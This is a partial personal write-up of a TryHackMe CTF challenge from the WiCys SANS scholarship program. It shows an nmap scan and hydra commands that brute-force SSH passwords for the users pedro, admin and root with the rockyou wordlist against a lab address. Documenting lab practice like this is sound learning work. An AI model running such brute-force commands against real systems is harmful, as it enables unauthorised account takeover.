# WiCys SANS Security Scholarship
# Tier 2 CTF Challenge

## :green_book: Introduction

I have had the opportunity to be a part of the [WiCys Security Training Scholarship](https://www.wicys.org/benefits/security-training-scholarship/). I've passed the first stage, which was a CTF challenge. Only 500 out of 2000 people moved on to the next stage. 

Stage 2 consists of gamified learning through [TryHackMe](www.tryhackme.com). I went through the Intro to Cybersecurity, Pre Security, Web Fundamentals, Jr. Pen Tester, and TryHackMe's new Cybersecurity 101 training rooms. I am now entering the final portion of the stage, which is a CTF challenge hosted on TryHackMe.

I did not think about doing a write-up to keep track of my learning progress before. I actually only recently learned of doing write-ups through GitHub. I'll be taking notes of how I solve this CTF challenge, but I won't be providing the exact answers.

## :one: 1. Start the AttackBox.

I will be using the AttackBox built in to THM.

## :two: 2. (Easy) Bruteforce Me

### Level Hint: I forgot my credentials yet again... Can you guess them for me? I think my user was either pedro, admin or root.

### Solution:
Going to run an nmap scan. 
```
nmap -sV 10.10.0.186
```
looking for open ports, specifically 22 (SSH), 80 (HTTP)

Port 22 is open

  Going to try to use the rockyou.txt which is found in most kali linux machines. `usr/share/wordlists/rockyou.txt`

  Going to try to test each username individually using hydra.
```
hydra -l pedro -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.186
```

### Notes:
